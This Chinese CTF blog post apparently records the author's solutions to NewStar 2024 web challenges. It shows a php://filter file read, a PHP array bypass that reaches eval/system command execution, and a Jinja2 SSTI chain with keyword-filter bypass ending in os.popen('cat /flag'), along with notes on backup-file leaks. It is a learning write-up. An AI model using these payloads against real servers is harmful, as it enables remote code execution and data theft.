+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</span><br></pre></td></tr></table></figure>
+<p>于是利用伪协议构造，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>​    得到经过Base64加密的flag，解密即可。</p>
+<h2 id="做题记录（newstar2024）"><a href="#做题记录（newstar2024）" class="headerlink" title="做题记录（newstar2024）"></a>做题记录（newstar2024）</h2><h3 id="题目：遗失的拉链"><a href="#题目：遗失的拉链" class="headerlink" title="题目：遗失的拉链"></a>题目：遗失的拉链</h3><p>拉链的英文是 zip，这里是网站备份文件的泄露</p>
+<p>可以用dirsearch扫描出存在www.zip:</p>
+<p>我们直接下载：</p>
+<p><img src="https://pic1.imgdb.cn/item/67dbe22088c538a9b5c1f5dd.png" alt=""></p>
+<p>pizwww.php的内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">// 欸 为啥 sha1 和 md5 相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;u can not do this &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>get 传入 new，post 传入 star，要求二者不相等并且 new 经过 sha1 加密要等于 star 经过 md5 加密，则可以 post 传入 cmd 命令进行调用，有一点正则的过滤，之后输出返回结果。</p>
+<p>采用数组绕过，payload：</p>
+<pre><code>pizwww.php?new[]=1
+post：star[]=2&amp;cmd=system(&quot;ls&quot;);
+</code></pre><p><img src="https://pic1.imgdb.cn/item/67dd3b6188c538a9b5c2e4c5.png" alt=""></p>
+<p>读取根目录下的 flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pizwww.php?new[]=<span class="number">1</span></span><br><span class="line">post：star[]=<span class="number">2</span>&amp;cmd=system(<span class="string">&quot;tac /f*&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/67dd3b9188c538a9b5c2e4d0.png" alt=""></p>
+<p><strong>flag{2aecd643-6c65-de9c-0edd-4e0de6525be8}</strong></p>
+<h3 id="题目：你能在一秒内打出八句英文吗"><a href="#题目：你能在一秒内打出八句英文吗" class="headerlink" title="题目：你能在一秒内打出八句英文吗"></a>题目：你能在一秒内打出八句英文吗</h3><p>使用脚本，获取页面内容并提交：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"> </span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.get(<span class="string">&#x27;......&#x27;</span>)</span><br><span class="line">welcome_title = BeautifulSoup(response.content, <span class="string">&#x27;html.parser&#x27;</span>).find(<span class="string">&#x27;h1&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;欢迎信息: <span class="subst">&#123;welcome_title&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">text = BeautifulSoup(session.get(<span class="string">&#x27;....../start&#x27;</span>).content, <span class="string">&#x27;html.parser&#x27;</span>).find(<span class="string">&#x27;p&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;text&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;需要打字的文本: <span class="subst">&#123;text&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">submit_response = session.post(<span class="string">&#x27;....../submit&#x27;</span>, data=&#123;<span class="string">&#x27;user_input&#x27;</span>: text&#125;)</span><br><span class="line">submit_soup = BeautifulSoup(submit_response.content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;提交结果: <span class="subst">&#123;submit_soup.find(<span class="string">&quot;p&quot;</span>).text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, info <span class="keyword">in</span> <span class="built_in">enumerate</span>(submit_soup.find_all(<span class="string">&#x27;p&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;额外信息 <span class="subst">&#123;idx + <span class="number">1</span>&#125;</span>: <span class="subst">&#123;info.text&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/67dd41bc88c538a9b5c2e655.png" alt=""></p>
+<p><strong>flag{7f335c0e-3104-1691-9600-d94014080de0}</strong></p>
+<h3 id="题目：复读机"><a href="#题目：复读机" class="headerlink" title="题目：复读机"></a>题目：复读机</h3><p>解法1</p>
+<p>输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 的时候，输出的结果是 49，说明存在 SSTI 注入</p>
+<p>输入 <code>&#123;&#123; [].__class__ &#125;&#125;</code>，发现 bot 显示不喜欢上课,说明 <code>class</code> 被过滤了，可以使用简单的拼接绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][&#x27;__cl&#x27;+&#x27;ass__&#x27;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到 <code>list</code> 类</p>
+<p><img src="https://ctf.xidian.edu.cn/api/media?hash=64c5608719e4e18ce74037769a1db69deeb043dbaed9bb8f829a12e58f32350a" alt="简单的 SSTI"></p>
+<p>后面就是基本的注入方法了</p>
+<p>获取 <code>object</code> 类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ctf.xidian.edu.cn/api/media?hash=d55ffa6762a9904e92a55d3da452bb8a2c0c4ff7f36e30230616df8131207d02" alt="获取 object 类"></p>
+<p>找一个可以利用的类，这里选用 <code>os._wrap_close</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[132]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ctf.xidian.edu.cn/api/media?hash=c1d29c5bc1de84b003be481a9d3c559e6a58e0e5a48b1a1e96525f0727fe1ca7" alt="获取 os._wrap_close"></p>
+<p>然后就是拿到 <code>eval</code> 方法，命令执行就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__base__&#x27;][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[132][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>解2：</p>
+<p><img src="https://pic1.imgdb.cn/item/67dd448788c538a9b5c2e6d9.png" alt=""></p>
+<p>这题考察的是SSTI 注入，不太熟悉，相关的题比较少。现在只是简单了解了一下。</p>
+<h2 id="题目总结学习"><a href="#题目总结学习" class="headerlink" title="题目总结学习"></a>题目总结学习</h2><h3 id="www-zip泄露"><a href="#www-zip泄露" class="headerlink" title="www.zip泄露"></a>www.zip泄露</h3><p>网站备份压缩文件泄露是一种常见的安全问题，通常发生在网站升级或维护过程中。当网站管理员对网站文件进行修改时，可能会对整站或部分页面进行备份，并将备份文件保存为zip、rar、tar.gz等格式。如果这些备份文件被放置在web服务器可以访问的目录下，而没有设置适当的访问权限，就可能导致敏感信息泄露</p>
+<p>常见的备份文件名包括<code>www.zip</code>、<code>web.zip</code>、<code>data.zip</code>、<code>backup.zip</code>等</p>
+<p>攻击者可以通过扫描工具如dirsearch等，尝试访问这些常见的备份文件路径，一旦发现可访问的压缩文件，就可以下载并解压，获取其中的敏感信息，如服务器配置文件、数据库连接信息等</p>
+<p>为了防范此类泄露，网站管理员应避免将备份文件存放在可公开访问的目录下，或者对备份文件设置严格的访问控制，如使用强密码保护、限制IP访问等</p>
+<p>例如，某网站在升级过程中，将网站源码备份为<code>www.zip</code>并存放在网站根目录下，且没有设置访问权限。攻击者通过扫描工具发现了这个压缩文件，下载后解压获取了网站的源代码，其中包含了数据库连接字符串等敏感信息，从而进一步入侵了该网站的数据库</p>
+<p>SSTI（Server-Side Template Injection）漏洞是一种针对服务器端模板引擎的安全漏洞，允许攻击者通过注入恶意代码来控制模板渲染过程，从而获取敏感信息或执行任意代码等操作</p>
+<h3 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h3><p>SSTI漏洞产生的主要原因是服务端在接收用户输入后，未对其进行有效的验证和过滤，就直接将其作为Web应用模板内容的一部分。当模板引擎在进行目标编译渲染时，攻击者注入的恶意代码会被当作合法的模板片段来处理，从而导致漏洞的利用。</p>
+<p><strong>原理</strong></p>
+<p>当攻击者能够控制要呈现的模板时，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就可能导致上下文数据的暴露，甚至在服务器上运行任意命令的表达式</p>
+<p><strong>利用方式</strong></p>
+<ol>
+<li><strong>关键字绕过</strong>：使用切片将逆置的关键字顺序输出，或者利用字符串拼接、join拼接、引号绕过、str原生函数replace替换、ascii转换、16进制编码绕过、base64编码绕过、unicode编码绕过等方法来绕过关键字过滤。</li>
+<li><strong>利用过滤器</strong>：在 JinJa2 等模板引擎中，利用内置的过滤器来逐步拼接出需要的字符、数字或字符串，从而构造出恶意代码。</li>
+<li><strong>绕过init</strong>：可以用 <code>__enter__</code> 或 <code>__exit__</code> 替代 <code>__init__</code>，以绕过对 <code>__init__</code> 的过滤。</li>
+</ol>
+<h3 id="SSTI注入的利用方式"><a href="#SSTI注入的利用方式" class="headerlink" title="SSTI注入的利用方式"></a>SSTI注入的利用方式</h3><h4 id="1-探测SSTI漏洞"><a href="#1-探测SSTI漏洞" class="headerlink" title="1. 探测SSTI漏洞"></a>1. 探测SSTI漏洞</h4><p>攻击者通常会先探测是否存在SSTI漏洞。常见的探测方法包括：</p>
+<ul>
+<li>发送特殊字符，观察服务器的响应。</li>
+<li>使用简单的模板语法，如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，如果服务器返回 <code>49</code>，则可能存在SSTI漏洞。</li>
+</ul>
+<h4 id="2-利用SSTI漏洞"><a href="#2-利用SSTI漏洞" class="headerlink" title="2. 利用SSTI漏洞"></a>2. 利用SSTI漏洞</h4><p>一旦确认存在SSTI漏洞，攻击者可以尝试以下操作：</p>
+<ul>
+<li><strong>读取敏感文件</strong>：通过模板引擎的文件读取功能，获取服务器上的敏感文件。</li>
+<li><strong>执行任意代码</strong>：利用模板引擎的代码执行功能，运行恶意代码。</li>
+<li><strong>获取服务器信息</strong>：通过模板引擎的内置函数，获取服务器的相关信息。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://czxh.top">M.Y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://czxh.top/2025/03/20/web%E5%91%A8%E6%8A%A503/">http://czxh.top/2025/03/20/web%E5%91%A8%E6%8A%A503/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://czxh.top" target="_blank">M.Yのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.imgdb.cn/item/67dbd62a88c538a9b5c1ec93.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>请狠狠鼓励我！(打赏)❤️</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/pic/charge.jpg" target="_blank"><img class="post-qr-code-img" src="/pic/charge.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/01/web%E5%91%A8%E6%8A%A501/" title="web周报01"><img class="cover" src="https://pic1.imgdb.cn/item/67d2c31b88c538a9b5bc822a.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">web周报01</div></div><div class="info-2"><div class="info-item-1">Web周报01【百丈之台，其始则一石耳，由是而二石焉，由是而三石，四石以至于千万石焉。领悟亦然。今日记一事，明日悟一理，积久而成学。——毛泽东】 1.前置任务进度 所需工具，插件，环境等已全部部署  计算机网络的学习进度： 已学习 网络协议，计算机网络结构，Internet结构，电路交换，多路复用……等内容 相关学习笔记发布在本人博客： https://www.czxh.top/2025/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/  Linux基础学习进度： 已掌握基本的操作。   2.网站学习日志目标：从一个网站入手，了解用户看到的前端页面是怎么组成的，再到是如何去和服务器后端进行连接和交互（发包的那些内容都去了哪，为什么会返回不同的响应） 构成前端的基础（三件套）：HTML（结构层）  作用：定义页面的内容和结构（如标题、段落、按钮等）。  示例： 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; ...</div></div></div></a><a class="pagination-related" href="/2025/03/01/web%E5%91%A8%E6%8A%A502/" title="web周报02"><img class="cover" src="https://pic1.imgdb.cn/item/67d3e49c88c538a9b5bd616a.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">web周报02</div></div><div class="info-2"><div class="info-item-1">Web周报02前置任务进度 前端学习日志：  HTML的内容已基本学习完毕 学习笔记： https://www.czxh.top/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/  PHP学习日志：  基本的语法已经掌握。 学习笔记： https://www.czxh.top/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ 本周做题（ns复现）题目：PangBai 过家家（1） 打开题目，第一关，提示在头部（Header），直接F12，查看header：  获得下一关的地址： 第二关：根据提示：  使用get方法尝试： 进入第三关：  提示另一种方法，也就是使用POST方法：  进入到下一关，提示agent: 我们设置useragent：  提示：你的话语似乎没有对 PangBai...</div></div></div></a><a class="pagination-related" href="/2025/02/19/misc01/" title="misc01（buuctf）"><img class="cover" src="https://pic1.imgdb.cn/item/67c2bbfbd0e0a243d408e0ee.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-19</div><div class="info-item-2">misc01（buuctf）</div></div><div class="info-2"><div class="info-item-1">[ACTF新生赛2020]NTFS数据流打开题目，压缩包中有很多txt文件：  根据题目内容，这道题与NTFS数据流有关。 NTFS交换数据流（Alternate DataStreams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上。 使用工具NtfsStreamsEditor或AlternateStreamView打开存放tmp文件夹，扫描出现NTFS交换数据流文件，导出后打开，得到flag（或双击查看）。  flag:  sqltest流量包，用wireshark打开：  题目为sqltest，那么猜测应该是让我们分析sql注入攻击的流量。 首先过滤HTTP： 看出为布尔盲注 我们将所有HTTP请求导入为csv文件： 分析文件，可以发现这里是在盲注db_flag库下的tb_flag表里的flag字段内容：  提取出flag的值： 102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56...</div></div></div></a><a class="pagination-related" href="/2025/02/24/misc%E5%91%A8%E6%8A%A501/" title="misc周报01"><img class="cover" src="https://pic1.imgdb.cn/item/67bc40f9d0e0a243d4037648.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-24</div><div class="info-item-2">misc周报01</div></div><div class="info-2"><div class="info-item-1">misc周报01【古之立大事者，不惟有超世之材，亦必有坚忍不拨之志        ——苏轼】 AliyunCTF 题目复现题目：mba首先，要清楚这个题是干什么的。 题目：mba I rolled my own MBA simplifier, but how disastrous could it be? 根据题目描述，这道题是关于一个mba简化器的，了解一下mba: MBA混淆算法是一种用于软件保护和恶意软件混淆的技术。它通过将算术运算（如加法、乘法）和布尔运算（如与、或、非）混合，生成复杂的表达式，从而增加代码的可读性和逆向工程的难度。这种算法常用于软件加固和恶意软件中，以隐藏核心逻辑 MBA表达式：  根据官方WP的解释，这是一个基于MBA-Blast算法的简易MBA简化器。  我们首先查看题目中有用的附件：  【1】new-tactic.patch在patches文件夹中，是new-tactic.patch文件，（.patch 文件是一种用于描述代码变更的文本文件，通常用于版本控制系统（如 Git、SVN...</div></div></div></a><a class="pagination-related" href="/2025/03/01/misc%E5%91%A8%E6%8A%A502/" title="misc周报02"><img class="cover" src="https://pic1.imgdb.cn/item/67d2c30288c538a9b5bc8228.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">misc周报02</div></div><div class="info-2"><div class="info-item-1">misc周报02【为者常成，行者常至。            ——《晏子春秋》】 本周流量分析专题练习（源自NSSCTF的流量分析题） 题目：[陇剑杯 2021]webshell 进行追踪流，在第六个流中找到登录账号密码：   Admin123!@# 题目：[陇剑杯 2021]jwt系列（问1——问6）问1： 追踪HTTP流，发现token  base64解码后，typ=jwt  (题目是jwt 当然是jwt认证方式……) 问2： 分析：JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 所以只要找到jwt解密即可。 通过分析数据包发现有个exec的命令执行成功，查看cookie   进行解码：  解码后id为10087，username为admin 问3： http contains “whoami”...</div></div></div></a><a class="pagination-related" href="/2025/03/15/misc%E5%91%A8%E6%8A%A504/" title="misc周报04"><img class="cover" src="https://pic1.imgdb.cn/item/67db783088c538a9b5c15fc9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">misc周报04</div></div><div class="info-2"><div class="info-item-1">周报03【我的生命，因战斗而无限绚烂，因你们而无限光明！        ——《吞噬星空》】 本周主要对月赛的复现。。。 题目：少女的签到题目打开，有29张图片：   分析图片属性，发现创建时间很久。 转换成时间戳，发现114514  因此这是通过每个图片的时间戳进行隐写的。 通过观察，创建时间的格式统⼀为1145140XXX 后三位可能是代表字符的⼗进制，写脚本提取： 1234567891011import ospath = &#x27;./result/&#x27;flag = &#x27;&#x27;for i in range(30):filename = path + str(i) + &#x27;.png&#x27;file_attr = os.stat(filename)create_time = int(file_attr.st_ctime)hide_char = chr(create_time - 1145140000)print(&#x27;file time: &#x27; + str(create_time) + &#x27; hide char:...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/pic/c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">M.Y</div><div class="author-info-description">Clian盟主の个人博客🍎🍎🍎</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MY-Nlny"><i class="fab fa-github"></i><span>✈️时空穿梭✈️</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MY-Nlny" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3171577201@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center>Welcome to my blog</p><center>主域名：<br><a target="_blank" rel="noopener" href="https://www.czxh.top"><b><font color="#5ea6e5">czxh.top</font></b></a>&nbsp;|&nbsp;<a target="_blank" rel="noopener" href="https://www.czxh.top"><b><font color="#5ea6e5">czxh.top</font></b></a><br>备用域名：<br><a target="_blank" rel="noopener" href="https://my-nlny.github.io/MY.github.io"><b><font color="#5ea6e5">MY.github.io</font></b></a><br></div><div id="welcome-info"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E5%91%A8%E6%8A%A503"><span class="toc-number">1.</span> <span class="toc-text">Web周报03</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.1.</span> <span class="toc-text">php弱比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BC%B1%E6%AF%94%E8%BE%83%E5%9C%BA%E6%99%AF"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">常见的弱比较场景</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">1. 字符串和数字比较</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E5%80%BC%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">2. 布尔值比较</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%95%B0%E7%BB%84%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text">3. 数组比较</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E5%BC%B1%E6%AF%94%E8%BE%83%E7%9A%84%E5%85%B7%E4%BD%93%E8%A7%84%E5%88%99"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">PHP 弱比较的具体规则</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">1. 比较运算符 (&#x3D;&#x3D;)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%B8%A5%E6%A0%BC%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.1.1.2.2.</span> <span class="toc-text">2. 严格比较运算符 (&#x3D;&#x3D;&#x3D;)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1. file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-http-%E5%92%8C-https"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">2. http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ftp-%E5%92%8C-ftps"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">3. ftp:&#x2F;&#x2F; 和 ftps:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-php"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">4. php:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-php-filter"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">5. php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-data"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">6. data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-zip"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">7. zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-glob"><span class="toc-number">1.1.2.8.</span> <span class="toc-text">8. glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-phar"><span class="toc-number">1.1.2.9.</span> <span class="toc-text">9. phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-ssh2"><span class="toc-number">1.1.2.10.</span> <span class="toc-text">10. ssh2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-rar"><span class="toc-number">1.1.2.11.</span> <span class="toc-text">11. rar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-ogg"><span class="toc-number">1.1.2.12.</span> <span class="toc-text">12. ogg:&#x2F;&#x2F;</span></a></li><li 